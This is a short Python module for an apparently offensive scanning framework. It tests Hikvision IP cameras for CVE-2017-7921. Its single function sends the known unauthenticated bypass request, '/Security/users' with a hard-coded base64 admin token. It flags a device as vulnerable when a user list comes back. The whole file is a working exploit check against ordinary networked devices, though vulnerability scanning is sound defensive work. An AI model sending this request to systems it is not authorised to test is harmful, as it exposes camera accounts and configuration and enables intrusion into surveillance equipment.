import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "hikvision/cve_2017_7921_scan"
        self.description = "Unauthenticated configuration and credential dump scanner for Hikvision devices (CVE-2017-7921)."
        self.type = "scan"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        if not target.startswith(("http://", "https://")):
            url = f"http://{target}:{port}/Security/users?auth=YWRtaW46MTIzNDU="
        else:
            url = f"{target.rstrip('/')}/Security/users?auth=YWRtaW46MTIzNDU="
            
        try:
            async with httpx.AsyncClient(timeout=5.0, verify=False) as client:
                response = await client.get(url)
                if response.status_code == 200 and ("<UserList" in response.text or "userName" in response.text):
                    return {
                        "vulnerable": True,
                        "details": "Hikvision administrative backend is fully vulnerable to configuration disclosures (CVE-2017-7921)."
                    }
        except Exception as e:
            return {"vulnerable": False, "error": str(e)}
        return {"vulnerable": False}
